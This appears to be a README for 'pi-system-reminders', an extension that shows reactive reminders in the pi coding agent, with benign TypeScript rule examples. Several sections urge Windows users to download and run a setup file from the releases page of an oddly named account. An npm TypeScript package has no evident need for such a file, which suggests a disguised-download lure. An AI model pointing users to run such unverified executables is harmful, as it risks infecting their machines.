# ⏱️ pi-system-reminders - Keep Pi on track

[Download the latest release](https://github.com/Handy-sorbussitchensis200/pi-system-reminders/releases){style="display:inline-block;padding:12px 18px;background:#6b7280;color:#ffffff;text-decoration:none;border-radius:8px;font-weight:600"}

## 🪟 Download for Windows

1. Open the [releases page](https://github.com/Handy-sorbussitchensis200/pi-system-reminders/releases)
2. Find the latest release at the top of the page
3. Under **Assets**, download the Windows file if one is listed
4. Save the file to your Downloads folder
5. If the file is a ZIP, right-click it and choose **Extract All**
6. Open the extracted folder and follow the steps below

If the release page shows a setup file, download that file and run it. If it shows a ZIP file, download and extract it first.

## 🚀 What this does

pi-system-reminders adds simple, reactive reminders to pi. It watches what happens in a conversation and sends a reminder when your rule says it should.

Use it when you want pi to:

- notice repeated failures
- pause before it keeps making the same mistake
- react to what just happened in the session
- follow small rules you define in a `.ts` file

It works with the same extension flow as other pi add-ons. You create one file, reload pi, and the reminder starts working.

## 📋 Before you start

You need:

- Windows 10 or Windows 11
- pi already installed
- a web browser
- permission to open downloaded files
- one folder where you can keep your reminder file

## 📥 Install the reminder package

If you already use pi extensions, install this package with:

```bash
pi install npm:pi-system-reminders
```

If you are using the Windows download from the release page, open the downloaded file first and follow the included steps.

## 🛠️ Set up your first reminder

Create this file in your pi folder:

`.pi/reminders/bash-spiral.ts`

Use this content:

```typescript
import type { ExtensionAPI } from "@mariozechner/pi-coding-agent";

export default function (pi: ExtensionAPI) {
  let consecutiveFailures = 0;

  pi.on("tool_result", async (event) => {
    if (event.toolName === "bash") {
      consecutiveFailures = event.isError ? consecutiveFailures + 1 : 0;
    }
  });

  return {
    on: "tool_execution_end",
    when: () => consecutiveFailures >= 3,
    message: "3 consecutive bash failures. Stop and rethink.",
    cooldown: 10,
  };
}
```

What this means in plain terms:

- the file watches for bash results
- it counts failed bash attempts
- after 3 failures in a row, it sends a reminder
- it waits before showing the same reminder again

## 🗂️ Where to put the file

Use this folder path:

`.pi/reminders/`

If the folder does not exist, create it.

A simple folder layout looks like this:

```text
Your pi folder
└── .pi
    └── reminders
        └── bash-spiral.ts
```

## 🔄 Load the reminder in pi

After you save the file:

1. Return to pi
2. Reload pi
3. Start using it again
4. Trigger the rule by repeating the action it watches

In the example above, if bash fails 3 times in a row, pi shows this reminder:

`3 consecutive bash failures. Stop and rethink.`

## ⚙️ How reminder files work

Each reminder file exports one default function.

That function can:

- watch events in pi
- keep simple state
- check a condition
- return a reminder message
- set a cooldown so the reminder does not repeat too soon

A reminder file has two parts:

- event tracking
- rule output

The first part watches what happens. The second part tells pi when to speak up.

## 🧩 Simple example rules

You can build reminder files for many common cases.

### Bash retry limit

Use this when you want pi to stop after too many failed shell commands.

```typescript
import type { ExtensionAPI } from "@mariozechner/pi-coding-agent";

export default function (pi: ExtensionAPI) {
  let failedCommands = 0;

  pi.on("tool_result", (event) => {
    if (event.toolName === "bash") {
      failedCommands = event.isError ? failedCommands + 1 : 0;
    }
  });

  return {
    on: "tool_execution_end",
    when: () => failedCommands >= 5,
    message: "5 bash failures in a row. Check the plan.",
    cooldown: 15,
  };
}
```

### Too many file edits

Use this when a task keeps changing the same files.

```typescript
import type { ExtensionAPI } from "@mariozechner/pi-coding-agent";

export default function (pi: ExtensionAPI) {
  let editCount = 0;

  pi.on("tool_result", (event) => {
    if (event.toolName === "edit_file") {
      editCount += 1;
    }
  });

  return {
    on: "tool_execution_end",
    when: () => editCount >= 10,
    message: "Many file edits in one session. Recheck the plan.",
    cooldown: 20,
  };
}
```

### Long search loop

Use this when pi keeps searching without making progress.

```typescript
import type { ExtensionAPI } from "@mariozechner/pi-coding-agent";

export default function (pi: ExtensionAPI) {
  let searchCount = 0;

  pi.on("tool_result", (event) => {
    if (event.toolName === "search") {
      searchCount += 1;
    }
  });

  return {
    on: "tool_execution_end",
    when: () => searchCount >= 8,
    message: "Many searches with no result. Try a new approach.",
    cooldown: 10,
  };
}
```

## 🧠 What the fields mean

The object you return can use these fields:

- `on` — the moment when pi checks the rule
- `when` — the condition that must be true
- `message` — the reminder text pi shows
- `cooldown` — how long pi waits before it can show the same reminder again

### `on`

This tells pi when to look at your rule.

Common values may include:

- `tool_execution_end`
- other event points in the pi session flow

### `when`

This is a function that returns `true` or `false`.

If it returns `true`, pi shows the reminder.

### `message`

This is the text the user sees.

Keep it short and direct.

### `cooldown`

This helps prevent repeat reminders from showing too often.

Use a small number for fast feedback or a larger one for slower checks.

## 🧪 Test your reminder

Try a simple test after you create the file:

1. Save the `.ts` file
2. Reload pi
3. Run the action your rule watches
4. Trigger the condition on purpose
5. Check that the reminder appears

If you do not see the reminder:

- make sure the file is in `.pi/reminders/`
- check the file name
- reload pi again
- confirm the condition is true
- check that the message text is valid

## 🪛 Common setup problems

### The reminder does not load

Check these items:

- the file ends in `.ts`
- the file is inside `.pi/reminders/`
- the code has one default export
- pi has been reloaded after you saved the file

### The reminder never appears

Check the rule logic:

- the counter may not reach the limit
- the event name may not match the tool you want
- the condition may reset too early

### The reminder appears too often

Raise the `cooldown` value.

You can also make the `when` check more strict.

### The wrong tool is watched

Check `event.toolName`.

In the example, the rule watches `bash`. If you want another tool, replace that value with the one you need.

## 📁 Folder example for Windows users

If you keep pi in your user folder, a path may look like this:

```text
C:\Users\YourName\.pi\reminders\bash-spiral.ts
```

If your pi files live in another place, use that location instead. The reminder file still belongs in the `.pi\reminders` folder.

## 🔐 Safety and control

pi-system-reminders only reacts to the rules you write.

You decide:

- what it watches
- when it speaks
- what message it shows
- how long it waits before repeating

That gives you a simple way to keep pi from running in circles.

## 📦 Release page download

To get the Windows file, visit the [release page](https://github.com/Handy-sorbussitchensis200/pi-system-reminders/releases) and download the latest asset listed there

## 🧾 Full starter file

Use this as a first reminder if you want a clean copy:

```typescript
import type { ExtensionAPI } from "@mariozechner/pi-coding-agent";

export default function (pi: ExtensionAPI) {
  let count = 0;

  pi.on("tool_result", (event) => {
    if (event.toolName === "bash") {
      count = event.isError ? count + 1 : 0;
    }
  });

  return {
    on: "tool_execution_end",
    when: () => count >= 3,
    message: "3 failed bash commands in a row. Stop and review.",
    cooldown: 10,
  };
}
```

## 🧭 Basic flow

1. Download the release from the link above
2. Install pi-system-reminders
3. Create a file in `.pi/reminders/`
4. Add your rule
5. Reload pi
6. Use pi and watch the reminder fire when the condition is met